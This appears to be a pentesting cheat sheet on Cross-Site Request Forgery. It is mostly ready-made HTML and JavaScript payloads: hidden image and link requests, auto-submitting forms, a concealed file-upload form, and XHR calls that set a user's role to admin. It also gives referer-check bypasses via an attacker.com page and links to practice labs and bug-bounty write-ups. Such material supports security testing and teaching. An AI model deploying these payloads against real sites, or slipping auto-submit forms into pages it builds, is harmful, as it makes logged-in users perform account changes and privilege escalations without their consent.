# Cross-Site Request Forgery

> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Payloads](#payloads)
    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
    * [HTML GET - No User Interaction)](#html-get---no-user-interaction)
    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
    * [HTML POST - multipart/form-data with file upload - Requiring User Interaction](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
    * [JSON GET - Simple Request](#json-get---simple-request)
    * [JSON POST - Simple Request](#json-post---simple-request)
    * [JSON POST - Complex Request](#json-post---complex-request)
* [Bypass referer header validation check](#bypass-referer-header-validation)
    * [Basic payload](#basic-payload)
    * [With question mark payload](#with-question-mark-payload)
    * [With semicolon payload](#with-semicolon-payload)
    * [With subdomain payload](#with-subdomain-payload)
* [Labs](#labs)
* [References](#references)


## Tools

* [XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.](https://github.com/0xInfection/XSRFProbe)


## Methodology

![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)

## Payloads

When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.


### HTML GET - Requiring User Interaction

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```


### HTML GET - No User Interaction

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```


### HTML POST - Requiring User Interaction

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```


### HTML POST - AutoSubmit - No User Interaction

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```


### HTML POST - multipart/form-data with file upload - Requiring User Interaction

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```


### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```


### JSON POST - Simple Request

With XHR :

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Bypass referer header validation

### Basic payload
```
1) Open https://attacker.com/csrf.html
2) Referer header is ..

Referer: https://attacker.com/csrf.html
```
### With question mark(`?`) payload
```
1) Open https://attacker.com/csrf.html?trusted.domain.com
2) Referer header is ..

Referer: https://attacker.com/csrf.html?trusted.domain.com
```

### With semicolon(`;`) payload
```
1) Open https://attacker.com/csrf.html;trusted.domain.com
2) Referer header is ..

Referer: https://attacker.com/csrf.html;trusted.domain.com
```

### With subdomain payload
```
1) Open https://trusted.domain.com.attacker.com/csrf.html
2) Referer headers is ..

Referer: https://trusted.domain.com.attacker.com/csrf.html
```


## Labs

* [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)


## References

- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/) 
- [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
- [Hacking PayPal Accounts with one click (Patched) - Yasser Ali](http://yasserali.com/hacking-paypal-accounts-with-one-click/)
- [Add tweet to collection CSRF - vijay kumar](https://hackerone.com/reports/100820)
- [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
- [How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
- [FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones](https://hackerone.com/reports/245346)
- [Hacking Facebook accounts using CSRF in Oculus-Facebook integration](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
- [Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
- [Cross-Site Request Forgery Attack - PwnFunction](https://www.youtube.com/watch?v=eWEgUcHPle0)
- [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
- [Bypass referer check logic for CSRF](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
